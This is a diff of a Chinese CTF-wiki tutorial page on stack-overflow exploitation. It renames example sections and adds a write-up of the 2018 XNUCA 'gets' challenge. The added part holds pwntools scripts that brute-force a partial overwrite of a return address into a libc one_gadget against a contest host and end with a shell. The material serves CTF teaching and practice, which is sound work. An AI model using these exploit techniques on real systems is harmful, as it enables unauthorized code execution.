@@ -236,7 +236,7 @@ ebp2|leave ret addr|arg1|arg2
 可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。
 
 
-### 例子
+### 2018 安恒杯 over
 以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over) 中找到
 
 #### 文件信息
@@ -337,7 +337,7 @@ pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
 leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 
 
 比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 `sub_400676` 函数来 leak libc。 
-	 
+​	 
 然后在下一次利用时就可以通过 rop 执行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)` 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 `execve("/bin/sh", 0, 0)` 的利用链, 这种方法更稳妥(`system("/bin/sh")` 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定
 
 #### exp
@@ -378,7 +378,7 @@ io.sendafter(">", payload)
 io.interactive()
 ```
 
-总的来说这种方法跟 stack pivot 差别并不是很大
+总的来说这种方法跟 stack pivot 差别并不是很大。
 
 ### 参考阅读
 
@@ -408,9 +408,9 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 
 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 `__fortify_fail` 函数中就会输出我们想要的信息。
 
-### 例子
+### 32C3 CTF readme
 
-这里，我们以 2015 年 32C3 CTF smashes 为例进行介绍，该题目在 jarvisoj 上有复现。
+这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 jarvisoj 上有复现。
 
 #### 确定保护
 
@@ -672,14 +672,14 @@ sh.interactive()
 这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。
 
 ### 题目
-2018网鼎杯 - guess
+- 2018 网鼎杯 - guess
 
 ## 栈上的 partial overwrite
-partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想
+partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。
 
-我们知道, 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护
+我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。
 
-### 例子
+### 2018-安恒杯-babypie
 以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite) 中
 #### 确定保护
 ```bash
@@ -871,4 +871,243 @@ while True:
         print e
 ```
 需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段
+
+### 2018-XNUCA-gets
+
+这个题目也挺有意思的，如下
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char *v4; // [rsp+0h] [rbp-18h]
+
+  gets((char *)&v4);
+  return 0LL;
+}
+```
+
+程序就这么小，很明显有一个栈溢出的漏洞，然而没有任何 leak。。
+
+#### 确定保护
+
+先来看看程序的保护
+
+```c
+[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+```
+
+比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。
+
+#### 分析
+
+我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。
+
+```asm
+pwndbg> stack 25
+00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+01:0008│      0x7fffffffe3a0 ◂— 0x1
+02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
+03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
+04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
+05:0028│      0x7fffffffe3c0 ◂— 0x0
+06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
+07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
+08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
+09:0048│      0x7fffffffe3e0 ◂— 0x0
+... ↓
+0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
+0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
+0d:0068│      0x7fffffffe400 ◂— 0x0
+... ↓
+10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
+11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
+12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0
+```
+
+其中 `__libc_start_main+240` 位于 libc 中，`_dl_init+139` 位于 ld 中
+
+```
+0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
+0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
+0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
+0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
+```
+
+一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？
+
+我们先来分析一下 `libc` 的基地址 `0x7ffff7a0d000`。我们一般要覆盖字节的话，至少要覆盖1个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 `gets`读取的，也就意味着字符串的末尾肯定会存在`\x00`。
+
+而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看`__libc_start_main+240` 的地址 `0x7ffff7a2d830`，如果覆盖3个字节，那么就是 `0x7ffff700xxxx`，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。
+
+一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 `__libc_start_main+240` ，显然是不可能的。
+
+而 ld 的基地址呢？如果我们覆盖了栈上`_dl_init+139`，即为`0x7ffff700xxxx`。而观察上述的内存布局，我们可以发现`libc`位于 `ld` 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为`\x00` 的。
+
+举个例子，目前两者之间的偏移为
+
+```
+0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
+```
+
+那么如果 ld 被加载到了 `0x7ffff73ca000`，则显然 `libc` 的起始地址就是`0x7ffff7000000`。
+
+因此，我们有足够的理由选择覆盖栈上存储的`_dl_init+139`。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，
+
+我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。
+
+```python
+from pwn import *
+context.terminal = ['tmux', 'split', '-h']
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+if args['DEBUG']:
+    context.log_level = 'debug'
+elfpath = './gets'
+context.binary = elfpath
+
+elf = ELF(elfpath)
+bits = elf.bits
+
+
+def exp(ip, port):
+    for i in range(0x1000):
+        if args['REMOTE']:
+            p = remote(ip, port)
+        else:
+            p = process(elfpath, timeout=2)
+        # gdb.attach(p)
+        try:
+            payload = 0x18 * 'a' + p64(0x40059B)
+            for _ in range(2):
+                payload += 'a' * 8 * 5 + p64(0x40059B)
+            payload += 'a' * 8 * 5 + p16(i)
+            p.sendline(payload)
+            data = p.recv()
+            print data
+            p.interactive()
+            p.close()
+        except Exception:
+            p.close()
+            continue
+
+
+if __name__ == "__main__":
+    exp('106.75.4.189', 35273)
+```
+
+最后发现报出了如下错误，一方面，我们可以判断出这肯定是 2.23 版本的 libc；另外一方面，我们我们可以通过`(cfree+0x4c)[0x7f57b6f9253c]`来最终定位 libc 的版本。
+
+```
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
+/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
+/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
+/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
+[0x7ffdec480f20]
+======= Memory map: ========
+00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
+00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
+00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
+00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
+7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
+7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
+7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
+7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
+7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
+7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
+7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
+7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
+7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+```
+
+确定好了 libc 的版本后，我们可以选一个 one_gadget，这里我选择第一个，较低地址的。
+
+```shell
+➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+```
+
+使用如下 exp 继续爆破，
+
+```python
+from pwn import *
+context.terminal = ['tmux', 'split', '-h']
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+if args['DEBUG']:
+    context.log_level = 'debug'
+elfpath = './gets'
+context.binary = elfpath
+
+elf = ELF(elfpath)
+bits = elf.bits
+
+
+def exp(ip, port):
+    for i in range(0x1000):
+        if args['REMOTE']:
+            p = remote(ip, port)
+        else:
+            p = process(elfpath, timeout=2)
+        # gdb.attach(p)
+        try:
+            payload = 0x18 * 'a' + p64(0x40059B)
+            for _ in range(2):
+                payload += 'a' * 8 * 5 + p64(0x40059B)
+            payload += 'a' * 8 * 5 + '\x16\02'
+            p.sendline(payload)
+
+            p.sendline('ls')
+            data = p.recv()
+            print data
+            p.interactive()
+            p.close()
+        except Exception:
+            p.close()
+            continue
+
+
+if __name__ == "__main__":
+    exp('106.75.4.189', 35273)
+```
+
+最后获取到 shell。
+
+```python
+$ ls
+exp.py  gets
+```
+
 ### 题目
